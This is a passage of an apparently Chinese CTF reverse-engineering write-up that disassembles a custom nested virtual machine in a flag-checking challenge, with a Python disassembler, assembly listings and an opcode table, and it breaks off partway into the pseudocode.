operand(addr + <span class="number">4</span>, <span class="number">4</span>)), addr + <span class="number">8</span></span><br><span class="line">        <span class="keyword">elif</span> ops == <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;mov %s, [%s]&#x27;</span> % (operand(addr, <span class="number">4</span>), operand(addr + <span class="number">4</span>, <span class="number">4</span>)), addr + <span class="number">8</span></span><br><span class="line">        <span class="keyword">elif</span> ops == <span class="number">6</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;mov %s, byte[%s]&#x27;</span> % (operand(addr, <span class="number">4</span>), operand(addr + <span class="number">4</span>, <span class="number">16</span>)), addr + <span class="number">20</span></span><br><span class="line">        <span class="keyword">elif</span> ops == <span class="number">7</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;mov %s, [%s]&#x27;</span> % (operand(addr, <span class="number">4</span>), operand(addr + <span class="number">4</span>, <span class="number">16</span>)), addr + <span class="number">20</span></span><br><span class="line">    <span class="keyword">elif</span> op <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">6</span>):</span><br><span class="line">        tag = (<span class="string">&#x27;add&#x27;</span>, <span class="string">&#x27;sub&#x27;</span>, <span class="string">&#x27;mul&#x27;</span>, <span class="string">&#x27;div&#x27;</span>)[op - <span class="number">2</span>]</span><br><span class="line">        ops = bits[addr:addr+<span class="number">2</span>].uint</span><br><span class="line">        addr += <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> ops == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;%s %s, %s&#x27;</span> % (tag, operand(addr, <span class="number">4</span>), operand(addr + <span class="number">4</span>, <span class="number">4</span>)), addr + <span class="number">8</span></span><br><span class="line">        <span class="keyword">elif</span> ops == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;%s %s, %s&#x27;</span> % (tag, operand(addr, <span class="number">4</span>), operand(addr + <span class="number">4</span>, <span class="number">16</span>)), addr + <span class="number">20</span></span><br><span class="line">        <span class="keyword">elif</span> ops == <span class="number">2</span>:</span><br><span class="line">            opss = bits[addr:addr+<span class="number">1</span>].uint</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> opss == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;%s byte[%s], %s&#x27;</span> % (tag, operand(addr, <span class="number">4</span>), operand(addr + <span class="number">4</span>, <span class="number">4</span>)), addr + <span class="number">8</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;%s [%s], %s&#x27;</span> % (tag, operand(addr, <span class="number">4</span>), operand(addr + <span class="number">4</span>, <span class="number">4</span>)), addr + <span class="number">8</span></span><br><span class="line">        <span class="keyword">elif</span> ops == <span class="number">3</span>:</span><br><span class="line">            opss = bits[addr:addr+<span class="number">1</span>].uint</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> opss == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;%s byte[%s], %s&#x27;</span> % (tag, operand(addr, <span class="number">4</span>), operand(addr + <span class="number">4</span>, <span class="number">16</span>)), addr + <span class="number">20</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;%s [%s], %s&#x27;</span> % (tag, operand(addr, <span class="number">4</span>), operand(addr + <span class="number">4</span>, <span class="number">8</span>)), addr + <span class="number">12</span></span><br><span class="line">    <span class="keyword">elif</span> op <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">9</span>):</span><br><span class="line">        tag = (<span class="string">&#x27;xor&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;or&#x27;</span>)[op - <span class="number">6</span>]</span><br><span class="line">        ops = bits[addr:addr+<span class="number">1</span>].uint</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> ops == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;%s %s, %s&#x27;</span> % (tag, operand(addr, <span class="number">4</span>), operand(addr + <span class="number">4</span>, <span class="number">4</span>)), addr + <span class="number">8</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            opss = bits[addr:addr+<span class="number">1</span>].uint</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> opss == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;%s %s, %s&#x27;</span> % (tag, operand(addr, <span class="number">4</span>), operand(addr + <span class="number">4</span>, <span class="number">8</span>)), addr + <span class="number">12</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;%s %s, %s&#x27;</span> % (tag, operand(addr, <span class="number">4</span>), operand(addr + <span class="number">4</span>, <span class="number">16</span>)), addr + <span class="number">20</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">9</span>:</span><br><span class="line">        ops = bits[addr:addr+<span class="number">1</span>].uint</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> ops == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;cmp %s, %s&#x27;</span> % (operand(addr, <span class="number">4</span>), operand(addr + <span class="number">4</span>, <span class="number">4</span>)), addr + <span class="number">8</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;cmp %s, %s&#x27;</span> % (operand(addr, <span class="number">4</span>), operand(addr + <span class="number">4</span>, <span class="number">16</span>)), addr + <span class="number">20</span></span><br><span class="line">    <span class="keyword">elif</span> op <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="number">16</span>) <span class="keyword">or</span> op <span class="keyword">in</span> (<span class="number">18</span>, <span class="number">20</span>, <span class="number">21</span>):</span><br><span class="line">        tag = (<span class="string">&#x27;jmp&#x27;</span>, <span class="string">&#x27;jae&#x27;</span>, <span class="string">&#x27;jbe&#x27;</span>, <span class="string">&#x27;ja&#x27;</span>, <span class="string">&#x27;jb&#x27;</span>, <span class="string">&#x27;push&#x27;</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="string">&#x27;call&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;jnz&#x27;</span>, <span class="string">&#x27;jz&#x27;</span>)[op - <span class="number">10</span>]</span><br><span class="line">        ops = bits[addr:addr+<span class="number">1</span>].uint</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> ops == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;%s %s&#x27;</span> % (tag, operand(addr, <span class="number">4</span>)), addr + <span class="number">4</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;%s %s&#x27;</span> % (tag, operand(addr, <span class="number">16</span>)), addr + <span class="number">16</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">16</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;pop %s&#x27;</span> % operand(addr, <span class="number">4</span>), addr + <span class="number">4</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">17</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;syscall&#x27;</span>, addr</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">19</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ret&#x27;</span>, addr</span><br><span class="line">    <span class="keyword">elif</span> op <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>, <span class="number">26</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&#x27;enter&#x27;</span>, <span class="string">&#x27;leave&#x27;</span>, <span class="string">&#x27;nop&#x27;</span>, <span class="string">&#x27;nop&#x27;</span>)[op - <span class="number">22</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;halt %d&#x27;</span> % op, addr</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> addr &lt; <span class="number">0xCCE</span>:</span><br><span class="line">    dis, <span class="built_in">next</span> = dism(bits, addr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%03X %s&#x27;</span> % (addr, dis))</span><br><span class="line">    addr = <span class="built_in">next</span></span><br><span class="line"> (addr, dis))</span><br><span class="line">    addr = <span class="built_in">next</span></span><br></pre></td></tr></table></figure><p>输出数据简单处理一下，得到下面的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line">000 jmp start</span><br><span class="line"></span><br><span class="line">sub_016:</span><br><span class="line">016 call sub_AD6</span><br><span class="line">02C add r0, 0x2</span><br><span class="line">047 mov r0, [r0]</span><br><span class="line">057 ret</span><br><span class="line"></span><br><span class="line">sub_05C:</span><br><span class="line">05C call sub_AD6</span><br><span class="line">072 add r0, 0x1</span><br><span class="line">08D mov r0, byte[r0]</span><br><span class="line">09D ret</span><br><span class="line"></span><br><span class="line">sub_0A2:</span><br><span class="line">0A2 call sub_AD6</span><br><span class="line">0B8 add r0, 0x2</span><br><span class="line">0D3 mov r0, byte[r0]</span><br><span class="line">0E3 ret</span><br><span class="line"></span><br><span class="line">sub_0E8:</span><br><span class="line">0E8 call sub_0A2</span><br><span class="line">0FE call sub_B0D</span><br><span class="line">114 mov r1, r0</span><br><span class="line">124 call sub_05C</span><br><span class="line">13A call sub_B58</span><br><span class="line">150 mov r0, 0x3</span><br><span class="line">16C call sub_A6A</span><br><span class="line">182 ret</span><br><span class="line"></span><br><span class="line">sub_187:</span><br><span class="line">187 call sub_016</span><br><span class="line">19D mov r1, r0</span><br><span class="line">1AD call sub_05C</span><br><span class="line">1C3 call sub_B58</span><br><span class="line">1D9 mov r0, 0x4</span><br><span class="line">1F5 call sub_A6A</span><br><span class="line">20B ret</span><br><span class="line"></span><br><span class="line">sub_210:</span><br><span class="line">210 call sub_0A2</span><br><span class="line">226 call sub_B0D</span><br><span class="line">23C mov r1, r0</span><br><span class="line">24C call sub_05C</span><br><span class="line">262 call sub_B0D</span><br><span class="line">278 mov byte[r0], r1</span><br><span class="line">289 mov r0, 0x3</span><br><span class="line">2A5 call sub_A6A</span><br><span class="line">2BB ret</span><br><span class="line"></span><br><span class="line">sub_2C0:</span><br><span class="line">2C0 call sub_0A2</span><br><span class="line">2D6 call sub_B0D</span><br><span class="line">2EC mov r1, byte[r0]</span><br><span class="line">2FC call sub_05C</span><br><span class="line">312 call sub_B58</span><br><span class="line">328 mov r0, 0x3</span><br><span class="line">344 call sub_A6A</span><br><span class="line">35A ret</span><br><span class="line"></span><br><span class="line">sub_35F:</span><br><span class="line">35F call sub_0A2</span><br><span class="line">375 call sub_B0D</span><br><span class="line">38B mov r1, r0</span><br><span class="line">39B call sub_05C</span><br><span class="line">3B1 push r0</span><br><span class="line">3BB call sub_B0D</span><br><span class="line">3D1 add r1, r0</span><br><span class="line">3E0 pop r0</span><br><span class="line">3E9 call sub_B58</span><br><span class="line">3FF mov r0, 0x3</span><br><span class="line">41B call sub_A6A</span><br><span class="line">431 ret</span><br><span class="line"></span><br><span class="line">sub_436:</span><br><span class="line">436 call sub_0A2</span><br><span class="line">44C call sub_B0D</span><br><span class="line">462 mov r1, r0</span><br><span class="line">472 call sub_05C</span><br><span class="line">488 push r0</span><br><span class="line">492 call sub_B0D</span><br><span class="line">4A8 sub r0, r1</span><br><span class="line">4B7 mov r1, r0</span><br><span class="line">4C7 pop r0</span><br><span class="line">4D0 call sub_B58</span><br><span class="line">4E6 mov r0, 0x3</span><br><span class="line">502 call sub_A6A</span><br><span class="line">518 ret</span><br><span class="line"></span><br><span class="line">sub_51D:</span><br><span class="line">51D call sub_0A2</span><br><span class="line">533 call sub_B0D</span><br><span class="line">549 mov r1, r0</span><br><span class="line">559 call sub_05C</span><br><span class="line">56F push r0</span><br><span class="line">579 call sub_B0D</span><br><span class="line">58F xor r1, r0</span><br><span class="line">59D pop r0</span><br><span class="line">5A6 call sub_B58</span><br><span class="line">5BC mov r0, 0x3</span><br><span class="line">5D8 call sub_A6A</span><br><span class="line">5EE ret</span><br><span class="line"></span><br><span class="line">sub_5F3:</span><br><span class="line">5F3 call sub_0A2</span><br><span class="line">609 call sub_B0D</span><br><span class="line">61F mov r1, r0</span><br><span class="line">62F call sub_05C</span><br><span class="line">645 call sub_B0D</span><br><span class="line">65B cmp r0, r1</span><br><span class="line">669 jnz loc_6B1</span><br><span class="line">67F mov r1, 0x1</span><br><span class="line">69B jmp loc_6BF</span><br><span class="line">loc_6B1:</span><br><span class="line">6B1 xor r1, r1</span><br><span class="line">loc_6BF:</span><br><span class="line">6BF mov r0, 0xE</span><br><span class="line">6DB call sub_B58</span><br><span class="line">6F1 mov r0, 0x3</span><br><span class="line">70D call sub_A6A</span><br><span class="line">723 ret</span><br><span class="line"></span><br><span class="line">sub_728:</span><br><span class="line">728 mov r0, 0xE</span><br><span class="line">744 call sub_B0D</span><br><span class="line">75A cmp r0, 0x1</span><br><span class="line">774 jz loc_813</span><br><span class="line">78A call sub_AD6</span><br><span class="line">7A0 add r0, 0x1</span><br><span class="line">7BB mov r1, [r0]</span><br><span class="line">7CB mov r0, 0xF</span><br><span class="line">7E7 call sub_B58</span><br><span class="line">7FD jmp loc_845</span><br><span class="line">loc_813:</span><br><span class="line">813 mov r0, 0x3</span><br><span class="line">82F call sub_A6A</span><br><span class="line">loc_845:</span><br><span class="line">845 ret</span><br><span class="line"></span><br><span class="line">sub_84A:</span><br><span class="line">84A xor r0, r0</span><br><span class="line">858 call sub_B0D</span><br><span class="line">86E mov r1, r0</span><br><span class="line">87E mov r0, 0x1</span><br><span class="line">89A call sub_B0D</span><br><span class="line">8B0 mov r2, r0</span><br><span class="line">8C0 mov r0, 0x1</span><br><span class="line">8DC syscall</span><br><span class="line">8E1 mov r1, r0</span><br><span class="line">8F1 mov r0, 0x0</span><br><span class="line">90D call sub_B58</span><br><span class="line">923 mov r0, 0x1</span><br><span class="line">93F call sub_A6A</span><br><span class="line">955 ret</span><br><span class="line"></span><br><span class="line">sub_95A:</span><br><span class="line">95A xor r0, r0</span><br><span class="line">968 call sub_B0D</span><br><span class="line">97E mov r1, r0</span><br><span class="line">98E mov r0, 0x1</span><br><span class="line">9AA call sub_B0D</span><br><span class="line">9C0 mov r2, r0</span><br><span class="line">9D0 mov r0, 0x0</span><br><span class="line">9EC syscall</span><br><span class="line">9F1 mov r1, r0</span><br><span class="line">A01 mov r0, 0x0</span><br><span class="line">A1D call sub_B58</span><br><span class="line">A33 mov r0, 0x1</span><br><span class="line">A4F call sub_A6A</span><br><span class="line">A65 ret</span><br><span class="line"></span><br><span class="line">sub_A6A:</span><br><span class="line">A6A mov r1, r0</span><br><span class="line">A7A call sub_AD6</span><br><span class="line">A90 add r1, r0</span><br><span class="line">A9F mov r0, 0xF</span><br><span class="line">ABB call sub_B58</span><br><span class="line">AD1 ret</span><br><span class="line"></span><br><span class="line">sub_AD6:</span><br><span class="line">AD6 mov r0, 0xF</span><br><span class="line">AF2 call sub_B0D</span><br><span class="line">B08 ret</span><br><span class="line"></span><br><span class="line">sub_B0D:</span><br><span class="line">B0D mul r0, 0x2</span><br><span class="line">B28 add r0, 0x4000</span><br><span class="line">B43 mov r0, [r0]</span><br><span class="line">B53 ret</span><br><span class="line"></span><br><span class="line">sub_B58:</span><br><span class="line">B58 mul r0, 0x2</span><br><span class="line">B73 add r0, 0x4000</span><br><span class="line">B8E mov [r0], r1</span><br><span class="line">B9F ret</span><br><span class="line"></span><br><span class="line">sub_BA4:</span><br><span class="line">BA4 call sub_AD6</span><br><span class="line">BBA mov r0, byte[r0]</span><br><span class="line">BCA cmp r0, 0xB</span><br><span class="line">BE4 jz loc_C60</span><br><span class="line">BFA mul r0, 0x2</span><br><span class="line">C15 add r0, 0x3800</span><br><span class="line">C30 mov r0, [r0]</span><br><span class="line">C40 call r0</span><br><span class="line">C4A jmp sub_BA4</span><br><span class="line">loc_C60:</span><br><span class="line">C60 ret</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">C65 mov r0, 0xF</span><br><span class="line">C81 mov r1, 0x2000</span><br><span class="line">C9D call sub_B58</span><br><span class="line">CB3 call sub_BA4</span><br><span class="line">CC9 halt 0</span><br></pre></td></tr></table></figure><p>可以看出，<code>start</code>调用了<code>sub_BA4</code>，而后者中有一行<code>call r0</code>。经过分析发现这又是另一个虚拟机（虚拟机2），这就是题目“俄罗斯套娃”的由来吧。虚拟机1的内存<code>0x3800</code>处存放了虚拟机2的<code>jump table</code>；<code>0x4000</code>处存放虚拟机2的寄存器；<code>0x2000</code>存放虚拟机2的指令。把跳转表中的每个函数都看一遍，它们的对应功能如下：</p><div class="table-container"><table><thead><tr><th>指令</th><th>操作</th></tr></thead><tbody><tr><td><code>00 x8 y8</code></td><td><code>mov reg:x, reg:y</code></td></tr><tr><td><code>01 x8 y16</code></td><td><code>mov reg:x, y</code></td></tr><tr><td><code>02 x8 y8</code></td><td><code>mov byte[reg:x], reg:y</code></td></tr><tr><td><code>03 x8 y8</code></td><td><code>mov reg:x, byte[reg:y]</code></td></tr><tr><td><code>04 x8 y8</code></td><td><code>add reg:x, reg:y</code></td></tr><tr><td><code>05 x8 y8</code></td><td><code>sub reg:x, reg:y</code>（但好像没有用到）</td></tr><tr><td><code>06 x8 y8</code></td><td><code>xor reg:x, reg:y</code></td></tr><tr><td><code>07 x8 y8</code></td><td><code>cmp reg:x, reg:y</code></td></tr><tr><td><code>08 x16</code></td><td><code>jnz x</code></td></tr><tr><td><code>09</code></td><td><code>read r0, r1</code>（读取输入缓冲区到<code>r0</code>指向的内存，长度为<code>r1</code>）</td></tr><tr><td><code>0A</code></td><td><code>write r0, r1</code>（输出缓冲区写出到<code>r0</code>指向的内存，长度为<code>r1</code>）</td></tr><tr><td><code>0B</code></td><td><code>halt</code></td></tr></tbody></table></div><p>这个就不写脚本了，直接手逆吧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">2000 01 00 00 39    mov r0, 0x3900</span><br><span class="line">2004 01 01 0D 00    mov r1, 0x00D0</span><br><span class="line">2008 0A             write r0, r1</span><br><span class="line">2009 01 00 00 50    mov r0, 0x5000</span><br><span class="line">200D 01 01 00 01    mov r1, 0x0100</span><br><span class="line">2011 09             read r0, r1</span><br><span class="line">2012 00 03 00       mov r3, r0</span><br><span class="line">2015 01 02 00 37    mov r2, 0x3700</span><br><span class="line">2019 01 0D 00 59    mov r13, 0x5900</span><br><span class="line">201D 01 04 00 00    mov r4, 0x0000</span><br><span class="line">2021 01 05 00 00    mov r5, 0x0000</span><br><span class="line">2025 01 01 01 00    mov r1, 0x0001</span><br><span class="line">2029 01 00 00 00    mov r0, 0x0000</span><br><span class="line">loc_202D:</span><br><span class="line">202D 04 04 01       add r4, r1</span><br><span class="line">2030 00 06 02       mov r6, r2</span><br><span class="line">2033 04 06 04       add r6, r4</span><br><span class="line">2036 00 0B 06       mov r11, r6</span><br><span class="line">2039 03 06 06       mov r6, byte[r6]</span><br><span class="line">203C 04 05 06       add r5, r6</span><br><span class="line">203F 02 0D 05       mov byte[r13], r5</span><br><span class="line">2042 03 05 0D       mov r5, byte[r13]</span><br><span class="line">2045 00 07 02       mov r7, r2</span><br><span class="line">2048 04 07 05       add r7, r5</span><br><span class="line">204B 00 0C 07       mov r12, r7</span><br><span class="line">204E 03 07 07       mov r7, byte[r7]</span><br><span class="line">2051 02 0C 06       mov byte[r12], r6</span><br><span class="line">2054 02 0B 07       mov byte[r11], r7</span><br><span class="line">2057 00 08 06       mov r8, r6</span><br><span class="line">205A 04 08 07       add r8, r7</span><br><span class="line">205D 02 0D 08       mov byte[r13], r8</span><br><span class="line">2060 03 08 0D       mov r8, byte[r13]</span><br><span class="line">2063 00 09 02       mov r9, r2</span><br><span class="line">2066 04 09 08       add r9, r8</span><br><span class="line">2069 03 09 09       mov r9, byte[r9]</span><br><span class="line">206C 01 0A 00 50    mov r10, 0x5000</span><br><span class="line">2070 04 0A 00       add r10, r0</span><br><span class="line">2073 03 0A 0A       mov r10, byte[r10]</span><br><span class="line">2076 06 0A 09       xor r10, r9</span><br><span class="line">2079 01 0B 00 48    mov r11, 0x4800</span><br><span class="line">207D 04 0B 00       add r11, r0</span><br><span class="line">2080 02 0B 0A       mov byte[r11], r10</span><br><span class="line">2083 04 00 01       add r0, r1</span><br><span class="line">2086 07 00 03       cmp r0, r3</span><br><span class="line">2089 08 2D 20       jnz loc_202D</span><br><span class="line">208C 01 00 00 00    mov r0, 0</span><br><span class="line">2090 01 01 00 48    mov r1, 0x4800</span><br><span class="line">2094 01 02 15 39    mov r2, 0x3915</span><br><span class="line">2098 01 03 57 00    mov r3, 0x0057</span><br><span class="line">209C 01 0D 01 00    mov r13, 0x0001</span><br><span class="line">loc_20A0:</span><br><span class="line">20A0 03 04 01       mov r4, byte[r1]</span><br><span class="line">20A3 03 05 02       mov r5, byte[r2]</span><br><span class="line">20A6 04 01 0D       add r1, r13</span><br><span class="line">20A9 04 02 0D       add r2, r13</span><br><span class="line">20AC 07 04 05       cmp r4, r5</span><br><span class="line">20AF 08 CE 20       jnz loc_20CE</span><br><span class="line">20B2 04 00 0D       add r0, r13</span><br><span class="line">20B5 07 00 03       cmp r0, r3</span><br><span class="line">20B8 08 A0 20       jnz loc_20A0</span><br><span class="line">20BB 01 00 0D 39    mov r0, 0x390D</span><br><span class="line">20BF 01 01 04 00    mov r1, 0x0004</span><br><span class="line">20C3 0A             write r0, r1</span><br><span class="line">20C4 01 01 69 7A    mov r1, 0x7A69</span><br><span class="line">20C8 07 00 01       cmp r0, r1</span><br><span class="line">20CB 08 E1 20       jnz loc_20E1</span><br><span class="line">loc_20CE:</span><br><span class="line">20CE 01 00 11 39    mov r0, 0x3911</span><br><span class="line">20D2 01 01 04 00    mov r1, 0x0004</span><br><span class="line">20D6 0A             write r0, r1</span><br><span class="line">20D7 01 01 69 7A    mov r1, 0x7A69</span><br><span class="line">20DB 07 00 01       cmp r0, r1</span><br><span class="line">20DE 08 E1 20       jnz loc_20E1</span><br><span class="line">loc_20E1:</span><br><span class="line">20E1 0B             halt</span><br></pre></td></tr></table></figure><p>把它们转换成伪代码的形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">write(&quot;Enter Flag: &quot;)</span><br><span class="line">len = read(buf, 256)</span><br><span 